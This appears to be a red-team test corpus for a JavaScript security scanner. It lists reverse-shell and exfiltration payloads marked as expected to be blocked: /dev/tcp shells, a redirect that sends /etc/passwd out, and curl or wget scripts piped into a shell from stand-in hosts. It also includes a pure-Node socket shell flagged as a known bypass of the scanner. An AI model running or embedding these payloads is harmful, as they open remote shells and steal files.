// red-team/corpus/reverse-shell.js
// Reverse-shell and remote-command-execution payloads.

module.exports = [
  {
    id: 'revsh-bash-devtcp',
    category: 'reverse-shell',
    technique: 'bash-dev-tcp',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Classic bash -i >& /dev/tcp reverse shell run via child_process',
    code: `
      const { exec } = require('child_process');
      exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
      module.exports = {};
    `,
  },
  {
    id: 'revsh-sh-devtcp',
    category: 'reverse-shell',
    technique: 'sh-dev-tcp',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'POSIX sh reverse shell over /dev/tcp',
    code: `
      require('child_process').execSync('sh -i >& /dev/tcp/attacker.example/9001 0>&1');
      module.exports = {};
    `,
  },
  {
    id: 'revsh-devtcp-redirect',
    category: 'reverse-shell',
    technique: 'dev-tcp-redirect',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Bare /dev/tcp redirect used for exfil/shell',
    code: `
      const cmd = 'cat /etc/passwd > /dev/tcp/10.10.10.10/8080';
      require('child_process').exec(cmd);
      module.exports = {};
    `,
  },
  {
    id: 'revsh-curl-pipe-bash',
    category: 'reverse-shell',
    technique: 'curl-pipe-bash',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Remote stager fetched and piped straight into bash',
    code: `
      require('child_process').execSync('curl https://evil.example/s.sh | bash');
      module.exports = {};
    `,
  },

  // ── Evasion variants ────────────────────────────────────────────────────────
  {
    id: 'revsh-node-net-spawn',
    category: 'reverse-shell',
    technique: 'pure-node-socket-shell',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    knownBypass: true,
    description: 'Pure-Node reverse shell: TCP socket wired to a spawned /bin/sh, no /dev/tcp string and no dynamic-code primitive (network+process-exec is not a blocking behavioral rule)',
    code: `
      const net = require('net');
      const { spawn } = require('child_process');
      const sock = net.connect(4444, 'attacker.example', () => {
        const sh = spawn('/bin/sh', []);
        sock.pipe(sh.stdin);
        sh.stdout.pipe(sock);
        sh.stderr.pipe(sock);
      });
      module.exports = {};
    `,
  },
  {
    id: 'revsh-wget-pipe-sh',
    category: 'reverse-shell',
    technique: 'wget-pipe-sh-evasion',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    knownBypass: false, // closed: pipe-to-shell BLOCK_REGEXES (Phase 1)
    description: 'wget ... | sh stager — dodges the "| bash" literal by piping into sh instead',
    code: `
      require('child_process').execSync('wget -qO- https://evil.example/s | sh');
      module.exports = {};
    `,
  },
];
